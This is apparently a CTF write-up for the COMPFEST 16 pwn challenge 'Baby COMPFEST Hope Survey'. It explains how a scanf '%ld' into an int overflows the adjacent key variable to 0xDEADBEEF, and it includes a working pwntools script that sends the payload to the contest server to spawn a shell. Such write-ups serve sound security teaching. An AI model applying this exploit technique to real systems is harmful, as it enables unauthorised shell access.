# COMPFEST CTF HACKER CLASS WRITEUP

## Baby COMPFEST Hope Survey

### Source Code
In this challenge, we are provided with the source code and binary file to exploit.

```c
#include <stdio.h>
#include <stdlib.h>

#define BUF_SIZE 0x100

__attribute__((constructor)) _()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Selamat datang para peserta CTF COMPFEST 16!");
    puts("Sebelum tahap penyisihan, kami ingin mengetahui harapan Anda sebagai peserta kami.");
    puts("Silakan isi form berikut dengan harapan Anda. Terima kasih!");
}

void read_val(const char *msg, void *ptr)
{
    printf("%s", msg);
    scanf("%ld", ptr);
}

void read_buf(const char *msg, char *buf, int length)
{
    printf("%s", msg);
    read(0, buf, BUF_SIZE);
}

int main()
{
    puts("\n===== Form Harapan Peserta CTF COMPFEST 16 =====");

    int key = 0;
    int length;
    read_val("Panjang harapan (biar efisien harap maklum): ", &length);
    if (length < 0 || length >= BUF_SIZE)
    {
        printf("Hayo jangan nackal ya dek...\n");
        return -1;
    }

    if (key == 0xDEADBEEF)
    {
        puts("\nEmang boleh se-hengker ini...");
        system("/bin/sh");
        return 69;
    }

    puts("Mohon maaf saat ini form sedang dalam perbaikan. Silakan coba chall sebelah dulu hehe.");
}
```

In the code above, we can see several functions that can potentially be exploited, such as `read_buf()`, although it is not called within the `main` function.

Next, we look at the `read_val()` function, where we see that our input is read using the format specifier `%ld` for a long integer. Negative values in long integers are represented in two's complement form. 

When this value is then cast or interpreted as an integer, only the lower 32 bits are used. This type confusion can be exploited to perform an integer overflow and change `key` to `0xDEADBEEF`.

### Exploitation

---

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/craft_payload_babby.png?raw=true)

---

By exploiting the type confusion, we can insert `DEADBEEF` in the first 8 bits and zeroes in the next 8 bits. This payload will cause an overflow and change the value of `key` from 0 to `DEADBEEF`.

---

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/effidence%201.png?raw=true)

---

As shown in the image above, the value of `key` (rbp-4) has been changed to `deadbeef`, and we can obtain a shell.

### Exploit with Python Script (pwn)
```python
from pwn import *

# Specify the remote server address and port
remote_address = 'challenges.ctf.compfest.id'
remote_port = 20005

# The value that will overwrite the key to 0xDEADBEEF
payload = '-2401053092612145152'

# Connect to the remote server
io = remote(remote_address, remote_port)

# Send the payload to the program
io.sendline(payload)

# Interact with the obtained shell
io.interactive()
```
---

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/evidence%202.png?raw=true)

---

Thank you.
